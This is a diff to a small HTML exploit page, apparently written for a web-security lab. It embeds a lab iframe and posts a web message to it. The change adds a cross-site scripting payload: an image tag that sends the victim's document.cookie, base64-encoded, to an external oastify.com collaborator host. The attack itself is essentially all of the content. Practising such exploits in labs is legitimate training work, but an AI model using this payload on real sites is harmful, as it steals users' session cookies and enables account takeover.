@@ -18,14 +18,15 @@
     }
 </style>
 
-<iframe id="myFrame" class="fullscreen-iframe" src="https://ptl-490b624e468d-250574a8e55a.libcurl.me/"></iframe>
+<iframe id="myFrame" class="fullscreen-iframe" src="https://ptl-5daa5f2d81a6-8460c6d0b93f.libcurl.me/"></iframe>
 
 
 <script>
 let iframe = document.getElementById("myFrame");
 
         iframe.onload = () => {
-            iframe.contentWindow.postMessage("user=test&id=0", "*");
+            iframe.contentWindow.postMessage('<img src="https://nri0muauwzrxz1mr72gqgtg8zz5qthh6.oastify.com?c='+btoa(document.cookie)+'" />', "*");
+            
         };
     </script>
 
